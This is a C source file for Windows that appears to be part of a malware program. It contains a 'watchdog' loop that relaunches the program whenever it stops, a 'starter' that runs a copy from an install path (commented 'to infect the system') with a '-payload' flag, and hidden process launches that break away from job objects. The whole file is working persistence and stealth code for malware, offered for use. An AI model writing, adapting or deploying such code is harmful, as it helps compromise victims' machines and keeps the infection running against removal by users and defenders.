#include <windows.h>
#include <io.h>

#include "utils.h"

extern char serviceName[64]; // Define a fixed size for serviceName

void watchdogStarter(char * argv[]){
    // Start the executable
    if(IsElevated()){
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        // Initialize STARTUPINFO and PROCESS_INFORMATION structs
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        char commandLine[128];
        strcpy(commandLine, "\"");
        strcat(commandLine, argv[0]);
        strcat(commandLine, "\" -watchdog");
        // Create the process with no inherited handles, custom environment, and no working directory inheritance
        CreateProcessA(
                NULL,           // Path to executable
                commandLine,            // Command line arguments
                NULL,                          // Process security attributes
                NULL,                          // Thread security attributes
                FALSE,                         // Don't inherit handles
                DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW, // Start in a new console (optional)
                NULL,                          // No custom environment
                NULL,                          // Don't inherit current directory
                &si,                           // Startup information
                &pi);                           // Process information
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        ShellExecuteA(NULL, "open", argv[0], "-watchdog", NULL, SW_HIDE);
    }
}

void starter(char * argv[]){
    // Get the destination path
    char destination[MAX_PATH];
    GetDestination(destination);
    strcat(destination, serviceName);    // Add the directory
    strcat(destination, "\\");
    strcat(destination, serviceName);    // Add the service name
    strcat(destination, ".exe");         // Add the extension

    // Check if the executable is in the destination
    if(_access(destination, 0) != 0){
        // Run the program to infect the system
        ShellExecuteA(NULL, "open", argv[0], NULL, NULL, SW_HIDE);
    }

    // Start the executable
    if(IsElevated()){
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        // Initialize STARTUPINFO and PROCESS_INFORMATION structs
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        char commandLine[128];
        strcpy(commandLine, "\"");
        strcat(commandLine, destination);
        strcat(commandLine, "\" -payload");
        // Create the process with no inherited handles, custom environment, and no working directory inheritance
        CreateProcessA(
                NULL,           // Path to executable
                commandLine,            // Command line arguments
                NULL,                          // Process security attributes
                NULL,                          // Thread security attributes
                FALSE,                         // Don't inherit handles
                DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW, // Start in a new console (optional)
                NULL,                          // No custom environment
                NULL,                          // Don't inherit current directory
                &si,                           // Startup information
                &pi);                           // Process information
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        ShellExecuteA(NULL, "open", destination, "-payload", NULL, SW_HIDE);
    }
}

void watchdog(char * argv[]){
    // SetParent(GetConsoleWindow(), NULL); // Unlink the process from the parent
    // Get the process name
    char processName[sizeof(serviceName) + 4];
    strcpy(processName, serviceName);
    strcat(processName, ".exe");
    // Watchdog process
    while(1){
        // Check if the process is running
        if(findFirstProc(processName) == 0){
            // Start the executable
            if(IsElevated()){
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                // Initialize STARTUPINFO and PROCESS_INFORMATION structs
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));

                char commandLine[128];
                strcpy(commandLine, "\"");
                strcat(commandLine, argv[0]);
                strcat(commandLine, "\" -starter");
                // Create the process with no inherited handles, custom environment, and no working directory inheritance
                CreateProcessA(
                        NULL,           // Path to executable
                        commandLine,            // Command line arguments
                        NULL,                          // Process security attributes
                        NULL,                          // Thread security attributes
                        FALSE,                         // Don't inherit handles
                        DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW, // Start in a new console (optional)
                        NULL,                          // No custom environment
                        NULL,                          // Don't inherit current directory
                        &si,                           // Startup information
                        &pi);                           // Process information
                // Close process and thread handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                starter(argv);
            }
        }
        Sleep(100);
    }
}